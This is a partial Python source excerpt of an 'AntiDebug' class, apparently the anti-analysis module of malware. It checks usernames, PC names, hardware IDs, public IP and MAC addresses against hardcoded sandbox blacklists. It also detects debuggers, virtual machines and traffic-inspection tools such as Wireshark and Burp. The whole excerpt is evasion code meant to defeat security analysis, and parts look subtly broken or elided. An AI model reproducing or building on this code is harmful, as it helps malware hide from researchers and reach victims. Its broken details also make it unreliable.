...
class AntiDebug:
    ...
    def checks(self) -> bool:
        ...
        # Check for blacklisted users, PC names, HWIDs, IPs, MAC addresses
        debugging |= self.check_blacklisted_users()
        debugging |= self.check_blacklisted_pc_names()
        debugging |= self.check_blacklisted_hwids()
        debugging |= self.check_blacklisted_ips()
        debugging |= self.check_blacklisted_macs()

        # Check for debugging tools
        debugging |= self.check_debugging_tools()

        # Check for suspicious processes
        debugging |= self.check_suspicious_processes()

        # Check for VM (Virtual Machine) environment
        debugging |= self.check_vm_environment()

        # Check for presence of strings in memory
        debugging |= self.check_memory_strings()

        # Check for network tools
        debugging |= self.check_network_tools()

        return debugging

    def check_blacklisted_users(self) -> bool:
        ...
        if user in self.blackListedUsers:
            return True
        return False

    def check_blacklisted_pc_names(self) -> bool:
        ...
        if pc_name.lower() in self.blackListedPCNames:
            return True
        return False

    def check_blacklisted_hwids(self) -> bool:
        ...
        if hwid.upper() in self.blackListedHWIDS:
            return True
        return False

    def check_blacklisted_ips(self) -> bool:
        ip = requests.get("https://api.ipify.org").text
        self.blackListedIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
    ...
    def check_blacklisted_macs(self) -> bool:
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        self.blackListedMacs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
    ...
    def check_debugging_tools(self) -> bool:
        tools = ['x32dbg', 'x64dbg', 'ollydbg', 'ida64', 'ida32', 'scylla', 'scylla_x64', 'scylla_x86', 'protection_id', 'windbg', 'reshacker', 'ImportREC', 'IMMUNITYDEBUGGER']
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() in tools:
                return True
        return False

    def check_suspicious_processes(self) -> bool:
        processes = ['vmware', 'vboxservice', 'vboxtray', 'vmtoolsd', 'vmcompute', 'vmwp', 'vmsrvc', 'vbox']
        for proc in psutil.process_iter(['pid', 'name']):
    ...
    def check_vm_environment(self) -> bool:
        return any(['VBOX' in d['DeviceDesc'] or 'VMware' in d['DeviceDesc'] for d in psutil.disk_partitions(all=False)])

    def check_memory_strings(self) -> bool:
        suspicious_strings = ["VBox", "virtualbox", "VMware", "qemu", "virtual", "hyperv", "vagrant"]
        for process in psutil.process_iter(['pid', 'name']):
            try:
                with open(f'/proc/{process.info["pid"]}/maps', 'rb') as f:
                    memory = f.read().decode('utf-8', 'ignore')
                if any(s in memory for s in suspicious_strings):
                    return True
            except Exception:
                continue
        return False

    def check_network_tools(self) -> bool:
        tools = ['wireshark', 'fiddler', 'burpsuite', 'tcpdump', 'nmap']
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() in tools:
                return True
        return False
